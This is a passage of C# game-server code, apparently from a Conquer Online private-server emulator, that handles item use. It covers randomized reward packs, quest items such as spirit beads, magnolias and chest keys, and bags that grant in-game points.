                            client.Inventory.Add(3004164, 0, 1);

                        }
                        if (Nr == 19)
                        {
                            client.Inventory.Add(3004142, 0, 1);

                        }
                        if (Nr == 20)
                        {
                            client.Inventory.Add(3004151, 0, 1);

                        }
                        if (Nr == 21)
                        {
                            client.Inventory.Add(3004160, 0, 1);

                        }
                        if (Nr == 22)
                        {
                            client.Inventory.Add(3004143, 0, 1);

                        }
                        if (Nr == 23)
                        {
                            client.Inventory.Add(3004152, 0, 1);

                        }
                        if (Nr == 24)
                        {
                            client.Inventory.Add(3004161, 0, 1);

                        }
                        if (Nr == 25)
                        {
                            client.Inventory.Add(3004165, 0, 1);

                        }
                        if (Nr == 26)
                        {
                            client.Inventory.Add(3004166, 0, 1);

                        }
                        if (Nr == 27)
                        {
                            client.Inventory.Add(3004144, 0, 1);

                        }
                        if (Nr == 28)
                        {
                            client.Inventory.Add(3004153, 0, 1);

                        }
                        if (Nr == 29)
                        {
                            client.Inventory.Add(3004145, 0, 1);

                        }
                        if (Nr == 30)
                        {
                            client.Inventory.Add(3004154, 0, 1);

                        }
                        if (Nr == 31)
                        {
                            client.Inventory.Add(3004162, 0, 1);

                        }
                        break;
                    }
                #endregion
                #region P7WeaponSoulPack
                case 3004247:
                    {
                        client.Inventory.Remove(item, Game.Enums.ItemUse.Remove);
                        Random R = new Random();
                        int Nr = R.Next(1, 16);
                        if (Nr == 1)
                        {
                            client.Inventory.Add(800020, 0, 1);
                        }
                        if (Nr == 2)
                        {
                            client.Inventory.Add(800111, 0, 1);

                        }
                        if (Nr == 3)
                        {
                            client.Inventory.Add(800142, 0, 1);

                        }
                        if (Nr == 4)
                        {
                            client.Inventory.Add(800215, 0, 1);

                        }
                        if (Nr == 5)
                        {
                            client.Inventory.Add(800255, 0, 1);

                        }
                        if (Nr == 6)
                        {
                            client.Inventory.Add(800422, 0, 1);

                        }
                        if (Nr == 7)
                        {
                            client.Inventory.Add(800522, 0, 1);

                        }
                        if (Nr == 8)
                        {
                            client.Inventory.Add(800618, 0, 1);

                        }
                        if (Nr == 9)
                        {
                            client.Inventory.Add(800725, 0, 1);

                        }
                        if (Nr == 10)
                        {
                            client.Inventory.Add(800810, 0, 1);
                        }
                        if (Nr == 11)
                        {
                            client.Inventory.Add(800811, 0, 1);
                        }
                        if (Nr == 12)
                        {
                            client.Inventory.Add(800917, 0, 1);

                        }
                        if (Nr == 13)
                        {
                            client.Inventory.Add(801004, 0, 1);

                        }
                        if (Nr == 14)
                        {
                            client.Inventory.Add(801104, 0, 1);

                        }
                        if (Nr == 15)
                        {
                            client.Inventory.Add(801218, 0, 1);

                        }
                        if (Nr == 16)
                        {
                            client.Inventory.Add(801216, 0, 1);

                        }
                        break;
                    }
                #endregion
                #region P6WeaponSoulPack
                case 729122:
                    {
                        client.Inventory.Remove(item, Game.Enums.ItemUse.Remove);
                        Random R = new Random();
                        int Nr = R.Next(1, 18);
                        if (Nr == 1)
                        {
                            client.Inventory.Add(800000, 0, 1);
                        }
                        if (Nr == 2)
                        {
                            client.Inventory.Add(800017, 0, 1);

                        }
                        if (Nr == 3)
                        {
                            client.Inventory.Add(800110, 0, 1);

                        }
                        if (Nr == 4)
                        {
                            client.Inventory.Add(800254, 0, 1);

                        }
                        if (Nr == 5)
                        {
                            client.Inventory.Add(800320, 0, 1);

                        }
                        if (Nr == 6)
                        {
                            client.Inventory.Add(800421, 0, 1);

                        }
                        if (Nr == 7)
                        {
                            client.Inventory.Add(800513, 0, 1);

                        }
                        if (Nr == 8)
                        {
                            client.Inventory.Add(800616, 0, 1);

                        }
                        if (Nr == 9)
                        {
                            client.Inventory.Add(800722, 0, 1);

                        }
                        if (Nr == 10)
                        {
                            client.Inventory.Add(800804, 0, 1);
                        }
                        if (Nr == 11)
                        {
                            client.Inventory.Add(800809, 0, 1);
                        }
                        if (Nr == 12)
                        {
                            client.Inventory.Add(800916, 0, 1);

                        }
                        if (Nr == 13)
                        {
                            client.Inventory.Add(801003, 0, 1);

                        }
                        if (Nr == 14)
                        {
                            client.Inventory.Add(801103, 0, 1);

                        }
                        if (Nr == 15)
                        {
                            client.Inventory.Add(801103, 0, 1);

                        }
                        if (Nr == 16)
                        {
                            client.Inventory.Add(801212, 0, 1);

                        }
                        if (Nr == 17)
                        {
                            client.Inventory.Add(801214, 0, 1);

                        }
                        if (Nr == 18)
                        {
                            client.Inventory.Add(801306, 0, 1);

                        }
                        client.Inventory.Add(727317, 0, 1);
                        client.Entity.ConquerPoints += 2000000;
                        break;
                    }
                #endregion
                #region P6DragonSoulPack
                case 727317:
                    {
                        client.Inventory.Remove(item, Game.Enums.ItemUse.Remove);
                        Random R = new Random();
                        int Nr = R.Next(1, 11);
                        if (Nr == 1)
                        {
                            client.Inventory.Add(822053, 0, 1);
                        }
                        if (Nr == 2)
                        {
                            client.Inventory.Add(822055, 0, 1);

                        }
                        if (Nr == 3)
                        {
                            client.Inventory.Add(823055, 0, 1);

                        }
                        if (Nr == 4)
                        {
                            client.Inventory.Add(823056, 0, 1);

                        }
                        if (Nr == 5)
                        {
                            client.Inventory.Add(823057, 0, 1);

                        }
                        if (Nr == 6)
                        {
                            client.Inventory.Add(824017, 0, 1);

                        }
                        if (Nr == 7)
                        {
                            client.Inventory.Add(821031, 0, 1);

                        }
                        if (Nr == 8)
                        {
                            client.Inventory.Add(821032, 0, 1);

                        }
                        if (Nr == 9)
                        {
                            client.Inventory.Add(820071, 0, 1);

                        }
                        if (Nr == 10)
                        {
                            client.Inventory.Add(820072, 0, 1);
                        }
                        break;
                    }
                #endregion
                #region Surprise-Box
                case 722178:
                    {
                        if (client.Inventory.Count <= 38)
                        {
                            client.Inventory.Remove(item, Game.Enums.ItemUse.RemoveFromStack);
                            //client.Inventory.Add(722057, 0, 1);//PowerEXPBall
                            client.Entity.ConquerPoints += 2;
                        }
                        else
                        {
                            client.Send(new Message("You Must have 1 space in you Inventory To Open You Box", Color.White, 255));
                        }
                        break;
                    }
                #endregion
                #region SpiritItems
                #region Normal
                case 729611:
                    {
                        if (client.SpiritBeadQ.CollectedSpirits < client.SpiritBeadQ.Requiredspirits)
                        {
                            client.Send(new Message("Collected spirits : " + client.SpiritBeadQ.CollectedSpirits + ", You need : " + client.SpiritBeadQ.Requiredspirits + ", To finish the task.", System.Drawing.Color.Red, Message.TopLeft));
                        }
                        else if (client.SpiritBeadQ.CollectedSpirits >= client.SpiritBeadQ.Requiredspirits)
                        {
                            client.Send(new Message("Congratulatons, You have finished SpiritTask", System.Drawing.Color.Red, Message.TopLeft));
                            client.SpiritBeadQ.Reset();
                            Network.GamePackets._String str = new Network.GamePackets._String(true)
                            {
                                Type = 10,
                                UID = client.Entity.UID
                            };
                            str.Texts.Add("zf2-e300");
                            client.Inventory.Add(729304, 0, 1);
                            client.IncreaseExperience(client.ExpBalls += 1, false);
                            client.Quests.FinishQuest(MaTrix.QuestID.Spirit_Beads);
                            client.Inventory.Remove(item, Game.Enums.ItemUse.Remove);
                        }
                        break;
                    }
                #endregion
                #region Refined
                case 729612:
                    {
                        if (client.SpiritBeadQ.CollectedSpirits < client.SpiritBeadQ.Requiredspirits)
                        {
                            client.Send(new Message("Collected spirits : " + client.SpiritBeadQ.CollectedSpirits + ", You need : " + client.SpiritBeadQ.Requiredspirits + ", To finish the task.", System.Drawing.Color.Red, Message.TopLeft));
                        }
                        else if (client.SpiritBeadQ.CollectedSpirits >= client.SpiritBeadQ.Requiredspirits)
                        {
                            client.Send(new Message("Congratulatons, You have finished SpiritTask", System.Drawing.Color.Red, Message.TopLeft));
                            client.SpiritBeadQ.Reset();
                            Network.GamePackets._String str = new Network.GamePackets._String(true)
                            {
                                Type = 10,
                                UID = client.Entity.UID
                            };
                            str.Texts.Add("zf2-e300");

                            client.Inventory.Add(729304, 0, 1);
                            client.IncreaseExperience(client.ExpBalls += (byte)1.5, false);
                            client.Quests.FinishQuest(MaTrix.QuestID.Spirit_Beads);
                            client.Inventory.Remove(item, Game.Enums.ItemUse.Remove);
                        }
                        break;
                    }
                #endregion
                #region Unique
                case 729613:
                    {
                        if (client.SpiritBeadQ.CollectedSpirits < client.SpiritBeadQ.Requiredspirits)
                        {
                            client.Send(new Message("Collected spirits : " + client.SpiritBeadQ.CollectedSpirits + ", You need : " + client.SpiritBeadQ.Requiredspirits + ", To finish the task.", System.Drawing.Color.Red, Message.TopLeft));
                        }
                        else if (client.SpiritBeadQ.CollectedSpirits >= client.SpiritBeadQ.Requiredspirits)
                        {
                            client.Send(new Message("Congratulatons, You have finished SpiritTask", System.Drawing.Color.Red, Message.TopLeft));
                            client.SpiritBeadQ.Reset();
                            Network.GamePackets._String str = new Network.GamePackets._String(true)
                            {
                                Type = 10,
                                UID = client.Entity.UID
                            };
                            str.Texts.Add("zf2-e300");
                            client.Inventory.Add(729304, 0, 1);
                            client.IncreaseExperience(client.ExpBalls += 2, false);
                            client.Quests.FinishQuest(MaTrix.QuestID.Spirit_Beads);
                            client.Inventory.Remove(item, Game.Enums.ItemUse.Remove);
                        }
                        break;
                    }
                #endregion
                #region Elite
                case 729614:
                    {
                        if (client.SpiritBeadQ.CollectedSpirits < client.SpiritBeadQ.Requiredspirits)
                        {
                            client.Send(new Message("Collected spirits : " + client.SpiritBeadQ.CollectedSpirits + ", You need : " + client.SpiritBeadQ.Requiredspirits + ", To finish the task.", System.Drawing.Color.Red, Message.TopLeft));
                        }
                        else if (client.SpiritBeadQ.CollectedSpirits >= client.SpiritBeadQ.Requiredspirits)
                        {
                            client.Send(new Message("Congratulatons, You have finished SpiritTask", System.Drawing.Color.Red, Message.TopLeft));
                            client.SpiritBeadQ.Reset();
                            Network.GamePackets._String str = new Network.GamePackets._String(true)
                            {
                                Type = 10,
                                UID = client.Entity.UID
                            };
                            str.Texts.Add("zf2-e300");
                            client.Inventory.Add(729304, 0, 1);
                            client.IncreaseExperience(client.ExpBalls += (byte)2.5, false);
                            client.Quests.FinishQuest(MaTrix.QuestID.Spirit_Beads);
                            client.Inventory.Remove(item, Game.Enums.ItemUse.Remove);
                        }
                        break;
                    }
                #endregion
                #region Super
                case 729703:
                    {
                        if (client.SpiritBeadQ.CollectedSpirits < client.SpiritBeadQ.Requiredspirits)
                        {
                            client.Send(new Message("Collected spirits : " + client.SpiritBeadQ.CollectedSpirits + ", You need : " + client.SpiritBeadQ.Requiredspirits + ", To finish the task.", System.Drawing.Color.Red, Message.TopLeft));
                        }
                        else if (client.SpiritBeadQ.CollectedSpirits >= client.SpiritBeadQ.Requiredspirits)
                        {
                            client.Send(new Message("Congratulatons, You have finished SpiritTask", System.Drawing.Color.Red, Message.TopLeft));
                            client.SpiritBeadQ.Reset();
                            Network.GamePackets._String str = new Network.GamePackets._String(true)
                            {
                                Type = 10,
                                UID = client.Entity.UID
                            };
                            str.Texts.Add("zf2-e300");
                            client.Inventory.Add(729304, 0, 1);
                            client.IncreaseExperience(client.ExpBalls += 3, false);
                            client.Quests.FinishQuest(MaTrix.QuestID.Spirit_Beads);
                            client.Inventory.Remove(item, Game.Enums.ItemUse.Remove);
                        }
                        break;
                    }
                #endregion
                #endregion

                #region ItemList
                case 729087:
                    {
                        Npcs dialog = new Npcs(client)
                        {
                            Client = client,
                            Replies = new List<NpcReply>()
                        };
                        var quest = client.Quests.GetQuest(MaTrix.QuestID.Eth_has_price);
                        dialog.Text("************************");
                        dialog.Text("Item : [" + quest.Mob + "]");
                        dialog.Text("Amount : [" + quest.Kills + "]");
                        dialog.Text("************************");
                        dialog.Option("i see", 255);
                        dialog.Send();
                        break;
                    }
                #endregion

                #region Magnoila
                #region Normal
                case 729306:
                    {
                        if (Kernel.GetDistance(client.Entity.X, client.Entity.Y, 99, 113) <= 5 || Kernel.GetDistance(client.Entity.X, client.Entity.Y, 105, 99) <= 5)
                        {
                            client.ProgressBar = new Franko.ProgressBar(client, "Normal", p =>
                            {
                                p.Inventory.Remove(item, Game.Enums.ItemUse.Remove);
                                p.IncreaseExperience(p.ExpBall / 5, true);
                                Network.GamePackets._String str = new Network.GamePackets._String(true)
                                {
                                    Type = 10,
                                    UID = p.Entity.UID
                                };
                                str.Texts.Add("accession3");
                                str.Texts.Add("end_task");
                                p.Inventory.Add(729304, 0, 1);
                                p.SendScreen(str.ToArray(), true);
                                p.Quests.FinishQuest(MaTrix.QuestID.Magnolias);

                            }, "Done", 5);

                        }
                        else
                            client.MessageBox("You Are To far Away.", null, null, 0);

                        break;
                    }
                #endregion
                #region Refined
                case 729307:
                    {
                        if (Kernel.GetDistance(client.Entity.X, client.Entity.Y, 99, 113) <= 5 || Kernel.GetDistance(client.Entity.X, client.Entity.Y, 105, 99) <= 5)
                        {
                            // if (Kernel.GetDistance(client.Entity.X, client.Entity.Y, npcs.X, npcs.Y) < 3)
                            {
                                client.ProgressBar = new Franko.ProgressBar(client, "Refined", p =>
                                {
                                    p.Inventory.Remove(item, Game.Enums.ItemUse.Remove);
                                    p.IncreaseExperience(p.ExpBall / 4, true);
                                    Network.GamePackets._String str = new Network.GamePackets._String(true)
                                    {
                                        Type = 10,
                                        UID = p.Entity.UID
                                    };
                                    str.Texts.Add("accession3");
                                    str.Texts.Add("end_task");
                                    p.Inventory.Add(729304, 0, 1);
                                    p.SendScreen(str.ToArray(), true);
                                    p.Quests.FinishQuest(MaTrix.QuestID.Magnolias);

                                }, "Done", 5);
                            }
                        }
                        else
                            client.MessageBox("You Are To far Away.", null, null, 0);

                        break;
                    }
                #endregion
                #region Unique
                case 729308:
                    {
                        if (Kernel.GetDistance(client.Entity.X, client.Entity.Y, 99, 113) <= 5 || Kernel.GetDistance(client.Entity.X, client.Entity.Y, 105, 99) <= 5)
                        {
                            //if (Kernel.GetDistance(client.Entity.X, client.Entity.Y, npcs.X, npcs.Y) < 3)
                            {
                                client.ProgressBar = new Franko.ProgressBar(client, "Unique", p =>
                                {
                                    p.Inventory.Remove(item, Game.Enums.ItemUse.Remove);
                                    p.Entity.ConquerPoints += 300;
                                    p.IncreaseExperience(p.ExpBall / 3, true);
                                    Network.GamePackets._String str = new Network.GamePackets._String(true)
                                    {
                                        Type = 10,
                                        UID = p.Entity.UID
                                    };
                                    str.Texts.Add("accession3");
                                    str.Texts.Add("end_task");
                                    p.Inventory.Add(729304, 0, 1);
                                    p.SendScreen(str.ToArray(), true);
                                    p.Quests.FinishQuest(MaTrix.QuestID.Magnolias);

                                }, "Done", 5);
                            }
                        }
                        else
                            client.MessageBox("You Are To far Away.", null, null, 0);

                        break;
                    }
                #endregion
                #region Elite
                case 729309:
                    {
                        if (Kernel.GetDistance(client.Entity.X, client.Entity.Y, 99, 113) <= 5 || Kernel.GetDistance(client.Entity.X, client.Entity.Y, 105, 99) <= 5)
                        {
                            // if (Kernel.GetDistance(client.Entity.X, client.Entity.Y, npcs.X, npcs.Y) < 3)
                            {
                                client.ProgressBar = new Franko.ProgressBar(client, "Elite", p =>
                                {
                                    p.Inventory.Remove(item, Game.Enums.ItemUse.Remove);
                                    p.Entity.ConquerPoints += 400;
                                    p.IncreaseExperience(p.ExpBall / 2, true);
                                    Network.GamePackets._String str = new Network.GamePackets._String(true)
                                    {
                                        Type = 10,
                                        UID = p.Entity.UID
                                    };
                                    str.Texts.Add("accession3");
                                    str.Texts.Add("end_task");
                                    p.Inventory.Add(729304, 0, 1);
                                    p.SendScreen(str.ToArray(), true);
                                    p.Quests.FinishQuest(MaTrix.QuestID.Magnolias);

                                }, "Done", 5);
                            }
                        }
                        else
                            client.MessageBox("You Are To far Away.", null, null, 0);

                        break;
                    }
                #endregion
                #region Super
                case 729310:
                    {
                        if (Kernel.GetDistance(client.Entity.X, client.Entity.Y, 99, 113) <= 5 || Kernel.GetDistance(client.Entity.X, client.Entity.Y, 105, 99) <= 5)
                        {
                            {
                                client.ProgressBar = new Franko.ProgressBar(client, "Super", p =>
                                {
                                    p.Inventory.Remove(item, Game.Enums.ItemUse.Remove);
                                    p.Entity.ConquerPoints += 1000;
                                    p.IncreaseExperience(p.ExpBall, true);
                                    Network.GamePackets._String str = new Network.GamePackets._String(true)
                                    {
                                        Type = 10,
                                        UID = p.Entity.UID
                                    };
                                    str.Texts.Add("accession3");
                                    str.Texts.Add("end_task");
                                    p.Inventory.Add(729304, 0, 1);
                                    p.SendScreen(str.ToArray(), true);
                                    p.Quests.FinishQuest(MaTrix.QuestID.Magnolias);

                                }, "Done", 5);
                            }
                        }
                        else
                            client.MessageBox("You Are To far Away.", null, null, 0);

                        break;
                    }
                #endregion
                #endregion

                #region ChiToken
                case 729304:
                    {
                        if (item.StackSize >= 7)
                        {
                            item.StackSize = 0;
                            client.Inventory.Remove(item, Game.Enums.ItemUse.Remove);
                            client.Entity.ConquerPoints += 5000;
                            client.Entity.SubClasses.StudyPoints += 2500;
                            client.Entity.Money += 10000000;
                            client.Send(new Message("Congratulations , you have got . 5000 Cps , 2500 StudyPoints and 10 Million Money", System.Drawing.Color.Tan, Message.TopLeft)); // Random Message
                        }
                        else
                        {
                            client.Send(new Message("You must have 7 ChiTokens stacked up Together.", System.Drawing.Color.Tan, Message.TopLeft)); // Random Message
                        }
                        break;
                    }
                #endregion
                #region GoldenExorcismPack
                case 729594:
                    {
                        if (item.StackSize >= 1)
                        {
                            item.StackSize = 0;
                            client.Inventory.Remove(item, Game.Enums.ItemUse.Remove);
                            client.Entity.ConquerPoints += 500;
                            client.Entity.SubClasses.StudyPoints += 50;
                            client.Entity.Money += 2000000;
                            client.Send(new Message("Congratulations , you have got . 500 Cps , 50 StudyPoints and 2 Million Money", System.Drawing.Color.Tan, Message.TopLeft)); // Random Message
                        }
                        else
                        {
                            client.Send(new Message("You must have 1 GoldenExorcismPack stacked up Together.", System.Drawing.Color.Tan, Message.TopLeft)); // Random Message
                        }
                        break;
                    }
                #endregion
                #region Gems pack
                case 721167:
                    {
                        Npcs dialog = new Npcs(client);
                        if (client.Inventory.Contains(721167, 1))
                        {
                            client.Inventory.Remove(721167, 1);

                            switch (((byte)Kernel.Random.Next(1, 10)))
                            {
                                case 1:
                                    client.Inventory.Add(700003, 0, 1);
                                    break;
                                case 2:
                                    client.Inventory.Add(700013, 0, 1);
                                    break;
                                case 3:
                                    client.Inventory.Add(700023, 0, 1);
                                    break;
                                case 4:
                                    client.Inventory.Add(700033, 0, 1);
                                    break;
                                case 5:
                                    client.Inventory.Add(700043, 0, 1);
                                    break;
                                case 6:
                                    client.Inventory.Add(700053, 0, 1);
                                    break;
                                case 7:
                                    client.Inventory.Add(700063, 0, 1);
                                    break;
                                case 8:
                                    client.Inventory.Add(700073, 0, 2);
                                    break;
                                case 9:
                                    client.Inventory.Add(700103, 0, 1);
                                    break;
                                case 10:
                                    client.Inventory.Add(700123, 0, 1);
                                    break;
                            }
                        }
                    }
                    break;
                #endregion
                #region SoilPigment
                case 3003742:
                    {
                        if (client.Inventory.Contains(3003742, 1))
                            if (client.Inventory.Contains(3003743, 1))
                                if (client.Inventory.Contains(3003744, 1))
                                    if (client.Inventory.Contains(3003738, 1))
                                        if (client.Inventory.Contains(3003739, 1))
                                            if (client.Inventory.Contains(3003741, 1))
                                            {
                                                client.Inventory.Remove(3003741, 1);
                                                client.Inventory.Remove(3003742, 1);
                                                client.Inventory.Remove(3003743, 1);
                                                client.Inventory.Remove(3003744, 1);
                                                client.Inventory.Remove(3003738, 1);
                                                client.Inventory.Remove(3003739, 1);
                                                client.Inventory.Add(3003746, 0, 1);
                                            }
                        Network.GamePackets.NpcReply npc = new Network.GamePackets.NpcReply(6, "Congratulations you got BubbleWater give it to TaoistYun.");
                    }
                    break;
                #endregion
                #region SoapPowder
                case 3003736:
                    {
                        if (client.Inventory.Contains(3003736, 1))
                        {
                            client.Inventory.Remove(3003736, 1);
                            client.Inventory.Add(3003739, 0, 1);
                        }
                        Network.GamePackets.NpcReply npc = new Network.GamePackets.NpcReply(6, "Congratulations you got SoapPowder.");
                    }
                    break;
                #endregion
                #region FlowerSoap
                case 3003737:
                    {
                        if (client.Inventory.Contains(3003737, 1))
                        {
                            client.Inventory.Remove(3003737, 1);
                            client.Inventory.Add(3003738, 0, 1);
                        }
                        Network.GamePackets.NpcReply npc = new Network.GamePackets.NpcReply(6, "Congratulations you got FruitSoap.");
                    }
                    break;
                #endregion
                #region EmptyBottle
                case 3003735:
                    {
                        if (client.Inventory.Contains(3003735, 1))
                        {
                            client.Inventory.Remove(3003735, 1);
                            client.Inventory.Add(3003740, 0, 1);
                        }
                        Network.GamePackets.NpcReply npc = new Network.GamePackets.NpcReply(6, "Congratulations you got RiverWater.");
                    }
                    break;
                #endregion
                #region RiverWater
                case 3003740:
                    {
                        if (client.Inventory.Contains(3003740, 1))
                        {
                            client.Inventory.Remove(3003740, 1);
                            client.Inventory.Add(3003741, 0, 1);
                        }
                        Network.GamePackets.NpcReply npc = new Network.GamePackets.NpcReply(6, "Congratulations you got BasicSoapyWater.");
                    }
                    break;
                #endregion
                #region Golden Secret quest items
                #region KeyBag
                case 3000624:
                    {
                        if (client.Entity.ChestDemonkill >= 1)
                        {
                            if (MTA.Kernel.ChanceSuccess(10))
                            {
                                client.Inventory.Add(3000627, 0, 1);
                                Network.GamePackets.NpcReply npc = new Network.GamePackets.NpcReply(6, "You gained a SilverKey from opening KeyBag.");
                                client.Send(npc.ToArray());
                                _String str = new _String(true);
                                str.UID = client.Entity.UID;
                                str.Type = _String.Effect;
                                str.Texts.Add("lounder1");
                                str.TextsCount = 1;
                                client.Entity.SendScreen(str);
                            }
                            else if (MTA.Kernel.ChanceSuccess(40))
                            {
                                client.Inventory.Add(3000626, 0, 1);
                                Network.GamePackets.NpcReply npc = new Network.GamePackets.NpcReply(6, "You gained a CopperKey from opening KeyBag.");
                                client.Send(npc.ToArray());
                                _String str = new _String(true);
                                str.UID = client.Entity.UID;
                                str.Type = _String.Effect;
                                str.Texts.Add("lounder1");
                                str.TextsCount = 1;
                                client.Entity.SendScreen(str);
                            }
                            else if (MTA.Kernel.ChanceSuccess(80))
                            {
                                client.Inventory.Add(3000625, 0, 1);
                                Network.GamePackets.NpcReply npc = new Network.GamePackets.NpcReply(6, "You gained a IronKey from opening KeyBag.");
                                client.Send(npc.ToArray());
                                _String str = new _String(true);
                                str.UID = client.Entity.UID;
                                str.Type = _String.Effect;
                                str.Texts.Add("lounder1");
                                str.TextsCount = 1;
                                client.Entity.SendScreen(str);
                            }
                            client.Entity.ChestDemonkill = 0;
                        }
                        else
                        {
                            Network.GamePackets.NpcReply npc = new Network.GamePackets.NpcReply(6, "You need to kill a ChestDemon to open KeyBag.");
                            client.Send(npc.ToArray());
                        }
                        break;
                    }
                #endregion
                #region IronKey
                case 3000625:
                    {
                        if (client.Entity.ChestDemonkill >= 1)
                        {
                            if (MTA.Kernel.ChanceSuccess(10))
                            {
                                client.Inventory.Remove(item, Game.Enums.ItemUse.Remove);
                                client.Inventory.Remove(3000624, 1);
                                client.Inventory.Add(3000628, 0, 1);
                                _String str = new _String(true);
                                str.UID = client.Entity.UID;
                                str.Type = _String.Effect;
                                str.Texts.Add("break_start");
                                str.TextsCount = 1;
                                client.Entity.SendScreen(str);
                                Network.GamePackets.NpcReply npc = new Network.GamePackets.NpcReply(6, "You received a Gold Key! Hurry and use it to open the Treasure Chest!");
                                client.Send(npc.ToArray());
                            }
                            else
                            {
                                client.Inventory.Remove(item, Game.Enums.ItemUse.Remove);
                                Network.GamePackets.NpcReply npc = new Network.GamePackets.NpcReply(6, "The Chest Demon suddenly bit you and fied away. What a pity...");
                                client.Send(npc.ToArray());
                            }
                        }
                        else
                        {
                            Network.GamePackets.NpcReply npc = new Network.GamePackets.NpcReply(6, "You have to kill ChestDemon again.");
                            client.Send(npc.ToArray());
                        }
                        break;
                    }
                #endregion
                #region CopperKey
                case 3000626:
                    {
                        if (client.Entity.ChestDemonkill >= 1)
                        {
                            if (MTA.Kernel.ChanceSuccess(20))
                            {
                                client.Inventory.Remove(item, Game.Enums.ItemUse.Remove);
                                client.Inventory.Remove(3000624, 1);
                                client.Inventory.Add(3000628, 0, 1);
                                _String str = new _String(true);
                                str.UID = client.Entity.UID;
                                str.Type = _String.Effect;
                                str.Texts.Add("break_start");
                                str.TextsCount = 1;
                                client.Entity.SendScreen(str);
                                Network.GamePackets.NpcReply npc = new Network.GamePackets.NpcReply(6, "You received a Gold Key! Hurry and use it to open the Treasure Chest!");
                                client.Send(npc.ToArray());
                            }
                            else
                            {
                                client.Inventory.Remove(item, Game.Enums.ItemUse.Remove);
                                Network.GamePackets.NpcReply npc = new Network.GamePackets.NpcReply(6, "The Chest Demon suddenly bit you and fied away. What a pity...");
                                client.Send(npc.ToArray());
                            }
                        }
                        else
                        {
                            Network.GamePackets.NpcReply npc = new Network.GamePackets.NpcReply(6, "You have to kill ChestDemon again.");
                            client.Send(npc.ToArray());
                        }
                        break;
                    }
                #endregion
                #region SilverKey
                case 3000627:
                    {
                        if (client.Entity.ChestDemonkill >= 1)
                        {
                            if (MTA.Kernel.ChanceSuccess(30))
                            {
                                client.Inventory.Remove(item, Game.Enums.ItemUse.Remove);
                                client.Inventory.Remove(3000624, 1);
                                client.Inventory.Add(3000628, 0, 1);
                                _String str = new _String(true);
                                str.UID = client.Entity.UID;
                                str.Type = _String.Effect;
                                str.Texts.Add("break_start");
                                str.TextsCount = 1;
                                client.Entity.SendScreen(str);
                                Network.GamePackets.NpcReply npc = new Network.GamePackets.NpcReply(6, "You received a Gold Key! Hurry and use it to open the Treasure Chest!");
                                client.Send(npc.ToArray());
                            }
                            else
                            {
                                client.Inventory.Remove(item, Game.Enums.ItemUse.Remove);
                                Network.GamePackets.NpcReply npc = new Network.GamePackets.NpcReply(6, "The Chest Demon suddenly bit you and fied away. What a pity...");
                                client.Send(npc.ToArray());
                            }
                        }
                        else
                        {
                            Network.GamePackets.NpcReply npc = new Network.GamePackets.NpcReply(6, "You have to kill ChestDemon again.");
                            client.Send(npc.ToArray());
                        }
                        break;
                    }
                #endregion
                #region AnniversaryJoyPack
                case 3000593:
                    {
                        client.Inventory.Remove(item, Game.Enums.ItemUse.Remove);
                        uint Uid = 0;
                        byte type = (byte)MTA.Kernel.Random.Next(1, 50);
                        switch (type)
                        {
                            case 1:
                                Uid = 800320;
                                break;

                            case 2:
                                Uid = 720891;
                                break;

                            case 3:
                                Uid = 800110;
                                break;

                            case 4:
                                Uid = 820056;
                                break;

                            case 5:
                                Uid = 822056;
                                break;

                            case 6:
                                Uid = 727100;
                                break;

                            case 7:
                                Uid = 822053;
                                break;

                            case 8:
                                Uid = 720662;
                                break;

                            case 9:
                                Uid = 800050;
                                break;

                            case 10:
                                Uid = 800015;
                                break;

                            case 11:
                                Uid = 800090;
                                break;

                            case 12:
                                Uid = 720681;
                                break;

                            case 13:
                                Uid = 800017;
                                break;

                            case 14:
                                Uid = 800071;
                                break;

                            case 15:
                                Uid = 800016;
                                break;

                            case 16:
                                Uid = 720675;
                                break;

                            case 17:
                                Uid = 800130;
                                break;

                            case 18:
                                Uid = 723340;
                                break;

                            case 19:
                                Uid = 800141;
                                break;

                            case 20:
                                Uid = 800200;
                                break;

                            case 21:
                                Uid = 800310;
                                break;

                            case 22:
                                Uid = 723342;
                                break;

                            case 23:
                                Uid = 800214;
                                break;

                            case 24:
                                Uid = 800230;
                                break;

                            case 25:
                                Uid = 800414;
                                break;

                            case 26:
                                Uid = 1088000;
                                break;

                            case 27:
                                Uid = 800420;
                                break;

                            case 28:
                                Uid = 800401;
                                break;

                            case 29:
                                Uid = 800512;
                                break;

                            case 30:
                                Uid = 823043;
                                break;

                            case 31:
                                Uid = 729477;
                                break;

                            case 32:
                                Uid = 800520;
                                break;

                            case 33:
                                Uid = 800521;
                                break;

                            case 34:
                                Uid = 720676;
                                break;

                            case 35:
                                Uid = 800614;
                                break;

                            case 36:
                                Uid = 800615;
                                break;

                            case 37:
                                Uid = 3001133;
                                break;

                            case 38:
                                Uid = 800617;
                                break;

                            case 39:
                                Uid = 800720;
                                break;

                            case 40:
                                Uid = 700123;
                                break;

                            case 41:
                                Uid = 800070;
                                break;

                            case 42:
                                Uid = 800723;
                                break;

                            case 43:
                                Uid = 800724;
                                break;

                            case 44:
                                Uid = 800018;
                                break;

                            case 45:
                                Uid = 820001;
                                break;

                            case 46:
                                Uid = 700103;
                                break;

                            case 47:
                                Uid = 820053;
                                break;

                            case 48:
                                Uid = 820054;
                                break;

                            case 49:
                                Uid = 820055;
                                break;

                            case 50:
                                Uid = 800722;
                                break;
                        }
                        client.Inventory.Add(Uid, 0, 1);
                        _String str = new _String(true);
                        str.UID = client.Entity.UID;
                        str.Type = _String.Effect;
                        str.Texts.Add("cortege");
                        str.TextsCount = 1;
                        client.Entity.SendScreen(str);
                        break;
                    }
                #endregion
                #endregion
                #region Bag Cps
                #region low Bag Cps
                case 3001133: // 5 cps
                    {
                        client.Entity.ConquerPoints += 5;
                        client.Inventory.Remove(item, Enums.ItemUse.RemoveFromStack);
                        break;
                    }
                case 720657: // 5 cps
                    {
                        client.Entity.ConquerPoints += 5;
                        client.Inventory.Remove(item, Enums.ItemUse.RemoveFromStack);
                        break;
                    }
                case 720656: // 10 cps
                    {
                        client.Entity.ConquerPoints += 10;
                        client.Inventory.Remove(item, Enums.ItemUse.RemoveFromStack);
                        break;
                    }
                case 3001134: // 10 cps
                    {
                        client.Entity.ConquerPoints += 10;
                        client.Inventory.Remove(item, Enums.ItemUse.RemoveFromStack);
                        break;
                    }
                case 3001135: // 20 cps
                    {
                        client.Entity.ConquerPoints += 20;
                        client.Inventory.Remove(item, Enums.ItemUse.RemoveFromStack);
                        break;
                    }
                case 720655: // 20 cps
                    {
                        client.Entity.ConquerPoints += 20;
                        client.Inventory.Remove(item, Enums.ItemUse.RemoveFromStack);
                        break;
                    }
                case 720658: // 25 cps
                    {
